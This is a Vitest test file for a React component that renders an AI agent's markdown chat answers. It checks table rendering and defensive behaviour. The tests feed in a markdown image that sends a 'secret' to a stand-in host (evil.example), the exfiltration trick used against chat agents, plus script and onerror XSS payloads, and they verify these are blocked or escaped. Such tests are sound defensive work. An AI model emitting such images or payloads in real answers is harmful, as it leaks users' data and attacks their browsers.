import { describe, expect, it } from "vitest"
import { renderToStaticMarkup } from "react-dom/server"
import { ChatMarkdown } from "@/components/agent/chat-markdown"

describe("ChatMarkdown", () => {
  it("renders agent markdown tables as tables, not pipes (QA F5)", () => {
    const html = renderToStaticMarkup(<ChatMarkdown text={"| Mode | Found |\n|---|---|\n| AGENTIC | 123 / 125 |"} />)
    expect(html).toContain("<table>")
    expect(html).toContain("<td>AGENTIC</td>")
    expect(html).not.toContain("|---|")
  })
})

describe("ChatMarkdown images", () => {
  it("never renders a remote image, so an answer cannot make the browser fetch an outside URL", () => {
    const html = renderToStaticMarkup(<ChatMarkdown text={"see ![leak](https://evil.example/x.png?d=secret)"} />)
    expect(html).not.toContain("<img")
    expect(html).toContain("leak")
  })
  it("escapes raw HTML in answers", () => {
    const html = renderToStaticMarkup(<ChatMarkdown text={'<script>alert(1)</script><img src=x onerror=alert(1)>'} />)
    expect(html).not.toContain("<script")
    expect(html).not.toMatch(/<img[^>]*onerror/)
  })
})
